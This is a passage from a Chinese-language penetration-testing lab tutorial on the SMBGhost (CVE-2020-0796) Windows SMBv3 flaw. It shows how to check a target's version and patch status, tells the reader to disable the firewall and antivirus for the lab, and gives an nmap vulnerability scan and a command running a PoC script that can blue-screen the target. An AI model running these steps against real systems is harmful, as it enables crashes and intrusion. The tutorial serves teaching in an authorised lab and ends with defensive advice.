1. **确认系统版本**：`Win + R` → `winver`，确认为 **Windows 10 Version 1903 或 1909**
2. **确认SMBv3压缩已启用**：PowerShell → `Get-SmbServerConfiguration | Select EnableCompressedTraffic`，结果为 `True`
3. **确认未安装KB4551762**：设置 → 更新和安全 → 查看更新历史记录
4. 关闭防火墙和杀毒软件（仅实验环境）

**Nmap漏洞验证**：

```bash
nmap -p 445 --script smb-vuln-cve-2020-0796 192.168.100.20
```

输出包含 `VULNERABLE` 则目标存在该漏洞。

### ⌨️ 命令行操作

```bash
# 使用PoC脚本触发漏洞（注意：存在蓝屏风险，仅在实验环境中操作）
python3 CVE-2020-0796.py -ip 192.168.100.20
```

> ⚠️ **实验安全提醒**：以上渗透操作仅限在授权的实验环境中进行，严禁对未授权目标使用。建议使用虚拟机搭建靶场，操作前做好快照备份。
> 

### 📝 本节小结

> SMBGhost的核心教训是：**新协议特性的引入会带来新的攻击面**，SMBv3的压缩功能因整数溢出导致内核级RCE，说明即使使用最新版本协议也不能放松对安全更新的关注。与MS17-010的对比：同为蠕虫级无认证RCE，但漏洞点从SMBv1协议本身（Trans2处理）转移到了SMBv3的新特性（压缩处理）。**两类漏洞的共同防御基础是：定期安装安全补丁 + 网络边界封堵SMB端口**。
>